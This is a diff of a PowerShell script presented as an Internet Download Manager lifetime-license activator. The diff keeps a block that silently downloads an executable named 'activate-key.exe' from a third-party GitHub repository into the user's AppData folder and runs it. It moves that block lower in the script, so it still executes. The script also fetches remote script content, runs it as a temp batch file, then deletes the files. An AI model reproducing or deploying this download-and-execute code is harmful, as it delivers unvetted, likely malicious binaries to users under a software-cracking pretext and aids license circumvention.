@@ -1,13 +1,5 @@
 # Check the instructions here on how to use it https://github.com/lstprjct/IDM-Activation-Script/wiki
 
-$ProcName = "activate-key.exe"
-$WebFile = "https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/activate-key.exe"
- 
-Clear-Host
- 
-(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
-Start-Process ("$env:APPDATA\$ProcName")
-
 $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
@@ -25,6 +17,14 @@ catch {
     $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
 }
 
+$ProcName = "activate-key.exe"
+$WebFile = "https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/activate-key.exe"
+ 
+Clear-Host
+ 
+(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
+Start-Process ("$env:APPDATA\$ProcName")
+
 $ScriptArgs = "$args "
 $prefix = "@REM $rand `r`n"
 $content = $prefix + $response
@@ -34,3 +34,4 @@ Start-Process $FilePath $ScriptArgs -Wait
 
 $FilePaths = @("$env:TEMP\IDM-Lifetime-license*.cmd", "$env:SystemRoot\Temp\IDM-Lifetime license*.cmd")
 foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
+
